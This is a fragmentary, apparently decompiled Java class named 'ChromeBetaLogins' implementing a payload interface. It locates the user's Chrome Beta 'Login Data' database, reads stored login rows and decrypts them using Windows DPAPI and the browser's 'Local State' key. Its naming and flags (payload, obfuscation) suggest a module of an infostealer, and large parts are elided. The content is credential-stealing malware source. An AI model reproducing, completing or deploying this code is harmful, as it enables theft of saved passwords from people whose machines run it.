...
public class ChromeBetaLogins implements IPayload
{
    ...
    public static ArrayList<String> getChromeInfo() {
        ...
        try {
            ...
            for (final File file : FileUtil.getFiles("C:\\Users\\" + System.getProperty("user.name") + "\\AppData\\Local\\Google\\Chrome Beta\\User Data")) {
                if (file.getName().contains("Login Data")) {
                    ...
                    while (rs != null && rs.next()) {
                        ...
                        else if (url.length() > 40 && ChromeBetaLogins.shorten) {
        ...
        try {
            ...
            if (WinDPAPI.isPlatformSupported()) {
                ...
                if (!isV10) {
                    ...
                    if (StringUtils.isEmpty((CharSequence)ChromeBetaLogins.localStateFileFullPathAndName)) {
                        throw new IllegalArgumentException("Local State is required");
                    }
                    final String localState = FileUtils.readFileToString(new File(ChromeBetaLogins.localStateFileFullPathAndName));
    ...
    static {
        localStateFileFullPathAndName = "C:\\Users\\" + System.getProperty("user.name") + "\\AppData\\Local\\Google\\Chrome Beta\\User Data\\Local State";
        ChromeBetaLogins.shorten = true;
        ChromeBetaLogins.obfus = false;
    }
}
